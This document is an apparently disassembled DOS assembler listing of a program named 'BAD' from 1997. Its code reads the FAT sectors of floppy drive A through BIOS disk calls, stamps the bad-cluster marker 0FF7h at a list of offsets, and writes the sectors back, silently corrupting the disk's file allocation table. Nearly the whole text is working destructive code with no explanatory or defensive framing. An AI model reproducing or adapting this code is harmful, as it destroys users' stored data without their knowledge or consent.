
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл					                                 лл
;лл				BAD	                                 лл
;лл					                                 лл
;лл      Created:   6-Mar-97		                                 лл
;лл      Passes:    2          Analysis	Options on: none                 лл
;лл					                                 лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

target		EQU   'T3'                      ; Target assembler: TASM-3.2

include  srmacros.inc


; The following equates show data references outside the range of the program.

data_3e		equ	3701h			;*
data_4e		equ	5C00h			;*
data_5e		equ	0A001h			;*
data_6e		equ	0C700h			;*
data_7e		equ	0C801h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

bad		proc	far

start:
;*		xor	si,si			; Zero register
		db	 33h,0F6h		;  Fixup - byte match
		mov	al,1
		xor	dx,dx			; Zero register
		mov	cx,2
		mov	bx,18Ah
loc_1:
		mov	ah,2
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
loc_2:
		mov	di,data_1[si]
		mov	word ptr es:[bx+di],0FF7h
		inc	si
		cmp	data_1[si],0FFFh
		jne	loc_2			; Jump if not equal
		mov	ah,3
		int	13h			; Disk  dl=drive a  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		inc	cx
		cmp	cx,5
		jne	loc_1			; Jump if not equal
		mov	ah,4Ch
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
data_1		dw	3			; Data table (indexed access)
		db	 0Ch, 00h, 12h, 00h, 1Bh, 00h
		db	 3Fh, 00h, 5Dh, 00h, 66h, 00h
		db	 6Ch, 00h, 75h, 00h, 50h, 01h
		db	 6Eh, 01h, 86h, 01h, 95h, 01h
		db	0AAh, 01h,0C8h, 01h,0FFh, 0Fh
		db	 9Ah, 00h,0A3h, 00h,0A9h, 00h
		db	0B2h, 00h,0C7h, 00h,0E5h, 00h
		db	0F4h, 00h, 12h, 01h,0E4h, 01h
		db	0FFh, 0Fh, 02h, 00h, 11h, 00h
		db	 1Ah, 00h, 20h, 00h, 29h, 00h
		db	 2Fh, 00h, 3Eh, 00h, 5Ch, 00h
		db	 2Eh, 01h, 37h, 01h, 3Dh, 01h
		db	 46h, 01h, 5Bh, 01h, 79h, 01h
		db	 88h, 01h, 91h, 01h, 97h, 01h
		db	0A0h, 01h,0FFh, 0Fh
		db	512 dup (0)

bad		endp

seg_a		ends



		end	start
